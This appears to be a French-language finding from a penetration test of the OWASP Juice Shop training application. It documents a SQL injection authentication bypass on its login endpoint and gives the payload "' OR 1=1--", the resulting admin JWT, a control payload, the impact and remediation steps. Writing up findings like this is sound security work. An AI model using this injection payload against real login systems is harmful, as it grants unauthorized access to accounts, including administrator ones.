# Vuln-001 — SQL Injection Authentication Bypass

## Gravité

Critique

## Endpoint

POST /rest/user/login

## Description

Le point d'authentification est vulnérable à une injection SQL permettant le contournement complet du mécanisme d'authentification.

L'attaquant peut obtenir un jeton JWT valide sans connaître les identifiants d'un utilisateur.

## Reproduction

### Requête

POST /rest/user/login

{
  "email":"' OR 1=1--",
  "password":"test"
}

### Résultat

HTTP/1.1 200 OK

JWT valide retourné.

Compte obtenu :

admin@juice-sh.op

### Vérification

Payload de contrôle :

{
  "email":"' OR 1=2--",
  "password":"test"
}

Résultat :

HTTP/1.1 401 Unauthorized

Cette différence confirme l'évaluation de la condition SQL injectée.

## Impact

- Contournement d'authentification
- Compromission du compte administrateur
- Accès complet aux fonctionnalités applicatives
- Escalade de privilèges

## Preuves

- captures/sqli-auth-bypass-01.png
- captures/sqli-auth-bypass-02.png
- captures/sqli-auth-bypass-03.png

## Recommandations

- Utiliser exclusivement des requêtes préparées
- Paramétrer correctement Sequelize
- Validation stricte des entrées
- Gestion générique des erreurs
- MFA pour les comptes sensibles